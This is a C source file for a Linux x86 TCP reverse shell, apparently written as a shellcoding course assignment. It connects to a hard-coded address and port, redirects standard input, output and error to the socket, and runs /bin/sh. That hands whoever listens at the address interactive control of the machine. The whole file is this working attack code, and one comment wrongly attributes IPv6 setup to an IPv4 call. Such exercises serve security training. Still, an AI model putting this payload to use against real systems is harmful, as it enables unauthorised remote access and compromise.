// SLAE - Assignment #2: Reverse Shell (TCP - Linux x86)
// Author: Kevin Kirsche <d3c3pt10n>
// Website: deceiveyour.team

#include <netinet/in.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

int sockfd;

int main() {
  struct sockaddr_in v4rhost;
  v4rhost.sin_family = AF_INET;
  // uint16_t htons(uint16_t hostshort);
  v4rhost.sin_port = htons(1337);
  // int inet_pton(int af, const char *src, void *dst);
  // NOTE: DO NOT USE inet_addr - this is warned against in the manpages
  inet_pton(AF_INET, "127.0.0.1", &(v4rhost.sin_addr.s_addr));


  // int socket(int domain, int type, int protocol);
  // AF_INET6 sets up the socket for IPv6 usage
  // SOCK_STREAM ensures it's a bi-directional communication
  // 0 says we're using the Internet Protocol (IP)
  sockfd = socket(AF_INET, SOCK_STREAM, 0);

  // int connect(int sockfd, const struct sockaddr *addr,
  //             socklen_t addrlen);
  connect(sockfd, (struct sockaddr*)&v4rhost, sizeof(v4rhost));

  // int dup2(int oldfd, int newfd);
  dup2(sockfd, 0);
  dup2(sockfd, 1);
  dup2(sockfd, 2);

  // int execve(const char *filename, char *const argv[],
  //            char *const envp[]);
  execve("/bin/sh", NULL, NULL);
  return 0;
}
